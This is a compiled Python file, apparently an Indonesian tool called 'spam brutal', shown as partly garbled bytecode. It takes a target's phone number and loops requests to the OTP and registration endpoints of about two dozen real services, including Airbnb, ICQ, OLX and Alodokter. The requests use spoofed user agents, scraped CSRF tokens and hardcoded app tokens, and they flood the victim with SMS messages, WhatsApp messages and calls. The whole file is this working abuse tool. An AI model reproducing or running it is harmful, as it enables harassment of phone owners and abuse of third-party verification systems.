U
    ��X_nX  �                   @   s  d dl Z d dlZd dlZd dlZd dlmZ d dlZd dl	m
Z
 d dlT d dlT d dlT d dlT G dd� d�ZG dd� d�Z�z,e�d	� e�  d
dddgZede� de� d�� eee��D ]0Zee� d�eed ��d� d ee  � q�eee� de� de� de � d���Z!e!dk�s(e!dk�r�e�d	� e�  eee� de� de� de� de"� de � d���Z#ee#�dk�r�ee� de� de� de� d�� e�$�  ee� de� de� de"� de � d e#� �� e�%�  n�e!d!k�s�e!d"k�r�e�d#� e�d$� n�e!d%k�se!d&k�r^e�d	� e�  ed'e� d(e� d)�� ed*e� d+e&� d,e� d-�� e�d$� nJe!d.k�sre!d/k�r~e�d0� n*ee� de� de� de� d1�� e�d$� W nl ej'k
�r�   ee� de� de� de� d2�� Y n6 e(k
�r   ee� de� de� de� d3�� Y nX dS )4�    N)�BeautifulSoup)�	UserAgent)�*c                   @   s   e Zd Zdd� ZdS )�mainc                   C   s  �z�t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �	t� t�  t �
t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  t �t� t�  tt� dt� dt� dt� d�� W nl tjk
�r�   tt� dt� dt� dt� d�� Y n6 t k
�r   tt� dt� dt� dt� d�� Y nX d S )N�[�   •�] zProses selesai�]z Koneksi Errorz Program dihentikan)!�spam�piza�nomZloding�map�mypoin�icq�adakami�coowry�iuga�fav�suplai�chataja�depop�ruparupa�dekoruma�jag�airbnb�kelaspintar�payfazz�	alodokter�prosehat�
theharvest�	danacinta�redbus�olx�print�ken�kun�kan�ru�ConnectionError�KeyboardInterrupt� r*   r*   �/sdcard/brutal.py�start   sh    






















$ $ z
main.startN)�__name__�
__module__�__qualname__r,   r*   r*   r*   r+   r   
   s   r   c                   @   s�   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/S )0r
   c                 C   s�   t jdddd�}d| i}td�D ]}tjd||d�}q d	|kr�tt� d
t� dt� dt� dt� dt	� t� dt� dt� dt� d�� nBtt� d
t� dt� dt� dt� dt	� t� dt� dt� dt� d�� d S )Nzhttps://www.phd.co.id/registerzapi-prod.diqit.io�application/json;charset=UTF-8)�
user-agent�referer�Host�content-type�phone�   z7https://api-prod.diqit.io/customer/v1/customer/register��headers�json�errorr   r   r   �Spam �(�SMS�) ZPizzahut� Gagal� OK)
�ua�random�ranger'   �postr#   r$   r%   r&   �im)r   �hd�dat�xZsiar*   r*   r+   r   ?   s    � Dz	spam.pizac           
      C   s  d}d}t �� }ddi}ddddd	d
dddddd�}|j||d�j}t|d�}|jdddd�d�}|j||d|  |d d�d�j}	|	dkr�tt� dt	� dt� dt� dt
� dt� t	� d t
� d!t� d"t
� d#�� nBtt� dt	� dt� dt� dt
� dt� t	� d t
� d!t� d"t	� d$�� d S )%Nz0https://mypoin.id/register/validate-phone-numberz&https://mypoin.id/register/request-otpr1   �zMozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36zvtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3�gzip, deflate, br�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7Z102�0application/x-www-form-urlencoded; charset=UTF-8zhttps://mypoin.id�cors�same-origin�XMLHttpRequest)�accept�accept-encoding�accept-language�content-lengthr4   �originr2   �sec-fetch-mode�sec-fetch-siter1   �x-requested-with�r8   �html.parser�inputZhidden�csrfmiddlewaretoken)�type�name�Zattrs�62�value)r5   r[   �r8   �dataz{"status": "ok"}r   r   r   r;   r<   r=   r>   ZMyPoinr@   r?   )r'   �Session�get�text�bs�findrD   r#   r$   r%   r&   rE   )
r   �urlZotp�rZuatZuatp�a�b�c�er*   r*   r+   r   K   s    
 Dzspam.mypoinc                 C   s�   dt jd�}dd|  i}td�D ]}tjd||d�}q d|kr�tt� d	t� d
t� dt� dt� dt� t� dt� dt� dt� d�� nBtt� d	t� d
t� dt� dt	� dt� t� dt	� dt� dt	� d�� d S )N�
keep-alive)�
Connectionr1   r5   r_   �   z)https://cmsapi.mapclub.com/api/signup-otp�rb   r8   r:   r   r   r   r;   r<   r=   r>   ZMapclubr?   ZMapClub� Ok)
rA   rB   rC   r'   rD   r#   r$   r%   rE   r&   )r   rF   rG   rH   Zpilr*   r*   r+   r   Y   s    � Dzspam.mapc                 C   s�   d}dddddddd	t jd
�	}t�dd|  ddddd�d��}tj|||d�j}t�|�}|d d dkr�tt	� dt
� dt	� dt	� dt� dt� t
� dt� dt	� dt
� d�� nBtt	� dt
� dt	� dt	� dt� dt� t
� dt� dt	� dt� d �� d S )!Nz,https://u.icq.net/api/v14/rapi/auth/sendCode�*/*z en-US,en;q=0.9,id;q=0.8,mt;q=0.7�application/jsonzhttp://web.icq.comzhttp://web.icq.com/�emptyrM   z
cross-site)	rP   rR   r4   rT   r2   �sec-fetch-destrU   rV   r1   z64708-1593781791r_   zen-US�smsZic1rtwz1s1Hj1O0rr   )r5   �languageZrouteZdevIdZapplication)ZreqIdZparamsra   �status�codei N  r   r   r   r;   r<   r=   r>   ZICQr?   r@   �rA   rB   r9   �dumpsr'   rD   re   �loadsr#   r$   r%   r&   rE   )r   rh   rF   rG   rj   rk   r*   r*   r+   r   c   s"    � 
 Dzspam.icqc                 C   s
  ddddddddd	dd
dddddddddd�}dd|  d�}t �|�}t�� }td�D ]}|jd||dd�j}qV|dks�|dkr�tt� dt	� dt� dt� d t
� d!t� t	� d"t
� d#t� d$t	� d%�� nBtt� dt	� dt� dt� d t
� d!t� t	� d"t
� d&t� d$t
� d'�� d S )(Nzapplication/json; charset=UTF-8Z34Zgzipzokhttp/3.8.0�in� Z800006Zandroid�defaultZadtubeagencyZAdakamiCampaign�1z1.7.0z	SM-G935FDz7.1.1Za4341a2sa90a4d97z$c7bbb23d-a220-4d43-9caf-153608f9bd39z!1580054114839-7395423911531673296)r4   rS   rQ   r1   rR   zx-ada-tokenzx-ada-appidzx-ada-oszx-ada-channelzx-ada-mediasourcezx-ada-agencyzx-ada-campaignz
x-ada-rolezx-ada-appversionzx-ada-devicezx-ada-modelzx-ada-os-verzx-ada-androididz	x-ada-aidz
x-ada-afidr   �0)ZketikZnomorrp   z5https://api.adakami.id/adaKredit/pesan/kodeVerifikasi�
   )rb   r8   Ztimeoutzx{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}z4{"result":-1,"resultMessage":"Gagal","content":null}r   r   r   r;   r<   r=   � ZAdaKamir?   r>   r@   )r9   r|   r'   rc   rC   rD   re   r#   r$   r%   r&   rE   )r   rF   rG   Zdatjsonri   Zspemrj   r*   r*   r+   r   u   s:      �
 Dzspam.adakamic                 C   s$  d}d}dddddddd	d
dt jd�}dd|  i}t�|�}t�� }|j|dt jid�j}td�D ] }|j	||d|d i|d�j
}	qbt�|	�d }
|
dkr�tt� dt� dt� dt� dt� dt� t� dt� dt� dt� d�� nBtt� dt� dt� dt� dt� dt� t� dt� dt� dt� d �� d S )!Nz#https://www.coowry.com/arlethdesignz!https://www.coowry.com/api/tokensrs   rJ   rK   Z28rt   zhttps://www.coowry.comru   rM   rN   )rP   rQ   rR   rS   r4   rT   r2   rv   rU   rV   r1   Zmsisdn�+62r1   rX   rp   Z_cwpeople_keyle_keyZ_cwpeople_key)r8   �cookiesrb   r\   �okr   r   r   r;   r<   r=   r>   ZCoowryr@   r?   )rA   rB   r9   r|   r'   rc   rd   r�   rC   rD   re   r}   r#   r$   r%   r&   rE   )r   rh   r
   rF   �targetZjsnri   rj   �irk   rl   r*   r*   r+   r   �   s0    �
 Dzspam.coowryc                 C   s  | � dd�}t�� }td�D ]�}|jddtjid�j}t|d�}|j	dd	d
id�}|j
ddtji|d |ddd�d�j}d|kr�tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� qtt� dt� dt� dt� dt� dt� dt� dt� dt� d�� qd S )Nr�   r   �   z#https://www.iuiga.com/register.htmlr1   rX   rY   �metar]   �
csrf-tokenr^   z.https://www.iuiga.com/login/send-register-code�contentr�   )Z_csrfr5   Z
phone_codeZis_loginra   �successr   r   r   r;   r<   r=   r>   ZIUGArr   r?   )�replacer'   rc   rC   rd   rA   rB   re   rf   rg   rD   r#   r$   r%   r&   )r   Zpisri   rH   rj   rk   rl   �dr*   r*   r+   r   �   s    
&@z	spam.iugac                 C   s�   dddt jdddddd	d
�
}dd|  i}tjdt�|�|d�j}d|kr�tt� dt	� dt� dt� dt
� dt� dt
� dt� dt	� d�� n>tt� dt	� dt� dt� dt
� dt� dt
� dt� dt
� d�� d S )Nzapi.myfave.comrn   zFave-PWA/v1.0.0rt   rs   zhttps://m.myfave.comz!https://m.myfave.com/jakarta/authrJ   rK   )
r3   ro   zx-user-agent�
User-Agentr4   �Accept�Origin�Referer�Accept-Encoding�Accept-Languager5   r_   z'https://api.myfave.com/api/fave/v3/authrq   r:   r   r   r   r;   r<   ZCAllr>   ZFaver?   �CALLr@   )rA   rB   r'   rD   r9   r|   re   r#   r$   r%   r&   �anj�r   rF   rG   rH   r*   r*   r+   r   �   s     � @zspam.favc                 C   s�   ddt jdddddd�}t�d	d
|  i�}td�D ]}tjd||d�}q2d|kr�tt� dt	� dt� dt� dt
� dt	� dt
� dt� dt	� d�� n>tt� dt	� dt� dt� dt
� dt	� dt
� dt� dt
� d�� d S )Nzapi.sooplai.com�!application/json, text/plain, */*rt   zhttps://www.sooplai.comz https://www.sooplai.com/registerrJ   rK   )r3   rP   r�   �Content-TyperT   r2   r�   r�   r5   r_   rp   z5https://api.sooplai.com/customer/register/otp/requestrq   r:   r   r   r   r;   r<   r=   r>   ZSooplair?   r@   )rA   rB   r9   r|   rC   r'   rD   r#   r$   r%   r&   r�   r*   r*   r+   r   �   s     �	@zspam.suplaic                 C   s�   t �ddd|  d�i�}tjd|dddd	d
dddddddd�d�j}t �|�d }|r�tt� dt� dt� dt� dt	� dt� dt	� dt� dt	� d�� n>tt� dt� dt� dt� dt	� dt� dt	� dt� dt� d�� d S )N�userzkiwari-prodr_   )Zapp_id�phone_numberz+https://api.chataja.co.id/api/v2/auth_noncer�   rK   rn   Z65r0   zapi.chataja.co.idzhttps://web.chataja.co.idzhttps://web.chataja.co.id/ru   rM   �	same-sitezsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36)r�   r�   ro   zContent-Lengthr�   r3   r�   r�   zSec-Fetch-DestzSec-Fetch-ModezSec-Fetch-Siter�   rq   rb   r   r   r   r;   r<   r=   r>   ZChatAjar@   r?   )
r9   r|   r'   rD   re   r}   r#   r$   r%   r&   )r   rb   rj   rk   r*   r*   r+   r   �   s    , @zspam.chatajac                 C   s�   dddddddd�}| d	d
�}t �|�}td�D ]}tjd||d�}q0d|jkr�tt� dt� dt� dt� dt	� dt� dt	� dt� dt� d�� n>tt� dt� dt� dt� dt	� dt� dt	� dt� dt	� d�� d S )Nzwebapi.depop.comZ49r�   zhttps://signup.depop.comZonrI   rt   )r3   rS   rP   rT   z	save-datar1   r4   ZID)r�   Zcountry_code�   z1https://webapi.depop.com/api/auth/v1/verify/phonera   r:   r   r   r   r;   r<   r=   r>   ZDepopr?   r@   )
r9   r|   rC   r'   Zputre   r#   r$   r%   r&   )r   rF   rG   ZdatjsrH   �yr*   r*   r+   r   �   s    


@z
spam.depopc                 C   sF  d}d}dddddddd	d
t jdddd�}dddddddd	d
t jdddd�}d|  dddd�}t�|�}d|  dddddd�}t�|�}tj|||d�j}	tj|||d�j}
t�|
�}|d dk�rtt	� dt
� dt	� dt	� d t� d!t� d"t� d#t	� d$t� d%�� n>tt	� dt
� dt	� dt	� d t� d!t� d"t� d#t	� d$t
� d&�� d S )'Nz-https://wapi.ruparupa.com/auth/check-otp-authz+https://wapi.ruparupa.com/auth/generate-otprt   z�eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyUz$id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&Z88zhttps://m.ruparupa.comz!https://m.ruparupa.com/my-accountrM   r�   ZmobileZodi)rP   �authorizationrR   rS   r4   rT   r2   rU   rV   r1   �user-platform�x-company-name�x-frontend-typeZ103zhttps://ruparupa.comz2https://ruparupa.com/verification?page=otp-choices)rP   rR   r�   rS   r4   rT   r2   rU   rV   r1   r�   r�   r�   r�   zabilseno11@gmail.com�registerr   )r5   �email�actionZpasswordZchatr   )r5   r�   Zchannelr�   Zcustomer_idZ	is_resendra   �messager�   r   r   r   r;   r<   �WAr>   ZRupaRupar@   r?   r{   )r   rh   Zurl2ZhdurlZhdurl2ZdataurlZdataurljsonZdataurl2Zdataurl2jsonrj   rk   rl   r*   r*   r+   r   �   sP      ��


@zspam.ruparupac                 C   s�   t �d|  dd��}t�� }td�D ]}|jddtjd�|d�j}q$d	|kr�t	t
� d
t� dt
� dt
� dt� dt� dt� dt
� dt� d�� n>t	t
� d
t� dt
� dt
� dt� dt� dt� dt
� dt� d�� d S )Nr�   Zwa)�phoneNumber�platformr�   zOhttps://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=jsonrt   )r4   r1   ra   r   r   r   r   r;   r<   r�   r>   ZDekorumar@   r?   )r9   r|   r'   rc   rC   rD   rA   rB   re   r#   r$   r%   r&   rE   )r   rb   ri   rH   �calr*   r*   r+   r     s    @zspam.dekorumac                 C   s�   t �d|  �}t�|j�}|d dkrftt� dt� dt� dt� dt� dt	� d	t� d
t� dt� d�� n>tt� dt� dt� dt� dt� dt	� d	t� d
t� dt� d�� d S )Nz.https://id.jagreward.com/member/verify-mobile/r�   zrAnda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.r   r   r   r;   r<   r�   r>   Z	JagRewardr@   r?   )
r'   rd   r9   r}   re   r#   r$   r%   r&   r�   )r   �pr�   r*   r*   r+   r     s
     @zspam.jagc                 C   s�   dddddt jdddd	d
ddd�}t�d|  ddd��}td�D ]}tjd||d�}q@d|jkr�tt	� dt
� dt	� dt	� dt� dt
� dt� dt	� dt� d�� n>tt	� dt
� dt	� dt	� dt� dt
� dt� dt	� dt
� d�� d S ) Nzwww.airbnb.co.idZ83�2zIV4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=r�   Z360rt   �.application/json, text/javascript, */*; q=0.01zno-cacherO   zhttps://www.airbnb.co.idz8https://www.airbnb.co.id/signup_login?redirect_url=/help)r3   rS   zdevice-memory�x-csrf-tokenzx-csrf-without-tokenr1   zviewport-widthr4   rP   zcache-controlrW   rT   r2   r_   ZGLOBAL_SIGNUP_LOGINZTEXT)r�   ZworkFlowZ	otpMethodrp   zshttps://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=idrq   ZinternationalPhoneNumberr   r   r   r;   r<   r=   r>   ZAirbnbr@   r?   )rA   rB   r9   r|   rC   r'   rD   re   r#   r$   r%   r&   )r   �headrG   rH   r�   r*   r*   r+   r      s(    �
@zspam.airbnbc                 C   s�   t �� }dtjdd�}| ddd�}|jd||d�j}d	|kr|tt� d
t� dt� dt� dt	� dt� dt	� dt� dt	� d�� n>tt� d
t� dt� dt� dt	� dt� dt	� dt� dt� d�� d S )NrO   zhttps://www.kelaspintar.id/)rW   r�   r�   Zsend_otp_regz%2B62)Zuser_mobileZotp_typeZmobile_codez/https://www.kelaspintar.id/user/otpverificationrq   zOTP sendr   r   r   r;   r<   r=   r>   ZKelasPintarr@   r?   )
r'   rc   rA   rB   rD   re   r#   r$   r%   r&   )r   ri   r8   rG   rH   r*   r*   r+   r   7  s    ��@zspam.kelaspintarc                 C   s�   ddddt jddddd	�	}t�� }|jd
|dd|  id�}d|jkr�tt� dt� dt� dt� dt	� dt� dt	� dt� dt	� d�� n>tt� dt� dt� dt� dt	� dt� dt	� dt� dt� d�� d S )Nzapi.payfazz.comZ17rs   zhttps://www.payfazz.comrL   z*http://www.payfazz.com/register/BEN6ZF74XLrJ   rK   )	r3   rS   rP   rT   r1   r4   r2   rQ   rR   z-https://api.payfazz.com/v2/phoneVerificationsr5   r�   ra   ZphoneVerificationIdr   r   r   r;   r<   r=   r>   ZPayFazzr@   r?   �
rA   rB   r'   rc   rD   re   r#   r$   r%   r&   )r   rF   ri   rj   r*   r*   r+   r   I  s    
@zspam.payfazzc                 C   s  t �� }|j�ddi� |�d�}t|jd�}|�dddi�d }tj	dddd	|d
�}|j
d|ddd|  iid�}|�� d dkr�tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� n>tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� d S )Nr2   z)https://www.alodokter.com/login-alodokterrY   r�   r]   r�   r�   rt   zhttps://www.alodokter.com)r1   r4   r2   rP   rT   r�   z1https://www.alodokter.com/login-with-phone-numberr�   r5   r�   r7   ry   r�   r   r   r   r;   r<   r=   r>   Z	Alodokterr@   r?   )r'   rc   r8   �updaterd   rf   re   rg   rA   rB   rD   r9   r#   r$   r%   r&   )r   ri   ZhyZtol�tokenrF   r�   r*   r*   r+   r   Q  s     
�@zspam.alodokterc                 C   s�   dddt jddd�}d|  dd	�}tjd
||d�}d|jkr|tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� n>tt� dt� dt� dt� dt� dt� dt� dt� dt� d�� d S )Nr�   zhttps://www.prosehat.comrO   rL   zhttps://www.prosehat.com/akun)rP   rT   rW   r1   r4   r2   r�   Zajaxverificationsend)Zphone_or_emailr�   z0https://www.prosehat.com/wp-admin/admin-ajax.phprq   r�   r   r   r   r;   r<   r=   r>   ZProsehatr@   r?   )	rA   rB   r'   rD   re   r#   r$   r%   r&   )r   r�   rG   Zngr*   r*   r+   r   d  s    �
@zspam.prosehatc                 C   s�   dt ji}d| i}t�� }|jd||d�}d|jkrttt� dt� dt� dt� d	t	� d
t� dt	� dt� dt	� d�� n>tt� dt� dt� dt� d	t	� d
t� dt	� dt� dt� d�� d S )Nr1   r5   z!https://harvestcakes.com/registerra   Zfunctionr   r   r   r;   r<   r=   r>   Z
TheHarvestr@   r?   r�   )r   rF   rG   ri   �hyur*   r*   r+   r   s  s     � �
@zspam.theharvestc                 C   s�   dt ji}td�D ]}tjd|  |d�}qt�|j�}|d dkr�tt	� dt
� dt	� d	t	� d
t� dt
� dt� dt	� dt� d�� n>tt	� dt
� dt	� d	t	� d
t� dt
� dt� dt	� dt
� d�� d S )Nr1   rp   z9https://api.danacita.co.id/users/send_otp/?mobile_phone=0rX   ZdetailzSuccessfully sent OTP SMSr   r   r   r;   r<   r=   r>   Z	DanaCintar@   r?   )rA   rB   rC   r'   rd   r9   r}   re   r#   r$   r%   r&   )r   rF   rH   ZyuZyu1r*   r*   r+   r    �  s    
@zspam.danacintac                 C   s�   t d�D ]}t�d|  d �j}qd|krjtt� dt� dt� dt� dt� d	t� d
t� dt� dt� d�� n>tt� dt� dt� dt� dt� d	t� d
t� dt� dt� d�� d S )N�   z&https://m.redbus.id/api/getOtp?number=z&cc=62&whatsAppOpted=trueZOTPr   r   r   r;   r<   r=   r>   ZRedBusr@   r?   )rC   r'   rd   re   r#   r$   r%   r&   )r   r�   Zkilr*   r*   r+   r!   �  s
    @zspam.redbusc                 C   s�   dddt jdd�}t�ddd|  d	d
��}t�� }td�D ]}|jd||d�j}q:d|kr�t	t
� dt� dt
� dt
� dt� dt� dt� dt
� dt� d�� n>t	t
� dt� dt
� dt
� dt� dt� dt� dt
� dt� d�� d S )Nrs   zVQMGU1ZVDxABU1lbBgMDUlI=z.83b09e49653c37fb4dc38423d82d74d7#1597271158063rt   )rP   zx-newrelic-idzx-panamera-fingerprintr1   r4   Zretryrw   r�   �id)Z	grantType�methodr5   rx   rp   z+https://www.olx.co.id/api/auth/authenticaterq   ry   r   r   r   r;   r<   r=   r>   ZOLXr@   r?   )rA   rB   r9   r|   r'   rc   rC   rD   re   r#   r$   r%   r&   )r   r�   rG   ri   rH   Zeekr*   r*   r+   r"   �  s$    ��@zspam.olxN)r-   r.   r/   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r   r    r!   r"   r*   r*   r*   r+   r
   >   s.   

*		r
   �clearZMulaizGrup WhatsAppz
Info ToolsZUpdatez	         ZMENUz        z [0r�   z] [31mr   r   r   zMasukkan pilihan : r�   Z01z
ex : 88xx
zMasukkan No Target z	>[1;33m rp   z$Mohon, masukkan no telp dengan benarzTarget z	> [1;33mr�   Z02z9xdg-open https://chat.whatsapp.com/LqEGHqFtQBwLEUbemADmTkzpython brutal.py�3Z03z
          zTENTANG TOOL INIz   �
zTools spam all for one adalah zFspam brutal (sms, wa, call) yang dibuat untuk menjahili teman2 kalian
zZBantu terus Team kami untuk mengembangkan tools ini, dengan cara tidak merecode sc ini 'v'�4Z04zgit pull; python brutal.pyzMasukkan pilihan dengan benarzKoneksi ErrorzProgram dihentikkan paksa))Z	threading�os�sysr9   Zbs4r   rf   Zrequestsr'   Zfake_useragentr   Z	warn.warnZ	etc.benerZetc.uaZ
etc.lodingr   r
   �systemZbnrZmenur#   ZtotZsoprC   �lenr�   r$   �str�ljustrZ   r%   r&   rE   r�   Zkinr   �exitr,   Zkonr(   r)   r*   r*   r*   r+   �<module>   sf    4  i
.$
0   *


���
  $ 